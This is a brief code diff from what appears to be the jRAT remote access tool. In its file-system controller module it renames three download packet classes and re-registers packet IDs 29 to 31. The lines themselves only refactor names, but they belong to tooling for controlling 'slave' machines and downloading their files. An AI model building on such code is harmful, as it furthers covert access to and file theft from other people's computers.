@@ -7,6 +7,9 @@ import jrat.api.ui.*;
 import jrat.controller.AbstractSlave;
 import jrat.controller.Slave;
 import jrat.controller.packets.incoming.IncomingPackets;
+import jrat.module.fs.packets.download.Packet29DownloadPart;
+import jrat.module.fs.packets.download.Packet30BeginDownload;
+import jrat.module.fs.packets.download.Packet31CompleteDownload;
 import jrat.module.fs.ui.PanelFileTransfers;
 import jrat.module.fs.packets.*;
 import jrat.module.fs.ui.PanelFileManager;
@@ -17,9 +20,9 @@ import jrat.module.fs.ui.PanelThumbView;
 public class FileSystemControllerModule extends ControllerModule {
 
     public void init() throws Exception {
-        IncomingPackets.register((short) 29, Packet29ServerDownloadPart.class);
-        IncomingPackets.register((short) 30, Packet30BeginServerDownload.class);
-        IncomingPackets.register((short) 31, Packet31CompleteServerDownload.class);
+        IncomingPackets.register((short) 29, Packet29DownloadPart.class);
+        IncomingPackets.register((short) 30, Packet30BeginDownload.class);
+        IncomingPackets.register((short) 31, Packet31CompleteDownload.class);
         IncomingPackets.register((short) 34, Packet34CustomDirectory.class);
         IncomingPackets.register((short) 22, Packet22ListFiles.class);
         IncomingPackets.register((short) 37, Packet37SearchResult.class);
